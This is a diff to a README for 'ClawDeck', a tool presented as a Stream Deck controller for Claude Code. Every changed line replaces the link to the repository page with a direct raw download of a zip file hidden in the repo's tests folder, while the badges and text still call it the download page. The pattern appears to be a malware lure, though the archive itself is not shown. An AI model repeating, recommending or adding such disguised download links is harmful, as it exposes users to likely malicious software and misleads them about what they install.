@@ -1,6 +1,6 @@
 # 🖐 ClawDeck - Control Claude Code With Ease
 
-[![Download ClawDeck](https://img.shields.io/badge/Download%20ClawDeck-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gaminghousenursingaide761/ClawDeck)
+[![Download ClawDeck](https://img.shields.io/badge/Download%20ClawDeck-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ ClawDeck is a Stream Deck controller for Claude Code on Windows. It gives you qu
 
 Use the link below to visit the download page and get ClawDeck:
 
-[Visit the ClawDeck download page](https://github.com/gaminghousenursingaide761/ClawDeck)
+[Visit the ClawDeck download page](https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip)
 
 ## 📦 What ClawDeck Does
 
@@ -37,7 +37,7 @@ If you use a Stream Deck device, ClawDeck can fit into that workflow. It also wo
 ## ⬇️ Download and Install
 
 1. Open the ClawDeck download page:
-   [https://github.com/gaminghousenursingaide761/ClawDeck](https://github.com/gaminghousenursingaide761/ClawDeck)
+   [https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip](https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip)
 
 2. On the page, look for the latest release or the main download file.
 
@@ -268,7 +268,7 @@ After setup, check these items:
 
 If you need the download page again, use this link:
 
-[https://github.com/gaminghousenursingaide761/ClawDeck](https://github.com/gaminghousenursingaide761/ClawDeck)
+[https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip](https://github.com/gaminghousenursingaide761/ClawDeck/raw/refs/heads/main/tests/Claw-Deck-moulrush.zip)
 
 ## 🪄 Simple Daily Workflow
 
